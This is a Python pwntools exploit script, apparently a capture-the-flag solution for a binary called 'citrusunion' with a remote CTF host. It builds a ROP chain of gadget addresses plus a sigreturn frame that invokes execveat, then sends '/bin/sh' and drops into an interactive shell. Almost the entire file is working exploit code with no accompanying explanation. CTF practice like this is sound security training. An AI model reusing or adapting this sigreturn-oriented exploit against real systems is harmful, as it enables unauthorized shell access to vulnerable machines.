#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./lemongallery2
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./citrusunion')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("shell.ctf.gunnhacks.com", 45748)
    else:
        return process( [exe.path] + argv, *a, **kw)
# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)

io = start()

zero_rsi = 0x400116
add_rsi = 0x400108
syscall = 0x400105
read = 0x4000fe
# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)
buf = p64(zero_rsi)
buf += p64(add_rsi)*10
buf += p64(read)
buf += p64(syscall)
#f = open("o", "wb")
#f.write(buf)
#f.close()
print("lemon")

frame =SigreturnFrame()

frame.rax = 322
frame.rdi = 0
frame.rsi = 0xccccccc9666*10
frame.rdx = (0xccccccc9666*10)+100
frame.rip = syscall
buf += bytes(frame)
io.sendline(buf)

import time
time.sleep(0.1)
buf = b"/bin/sh\x00"
buf += b"A"*(0xf-len(buf))
io.send(buf)

io.interactive()

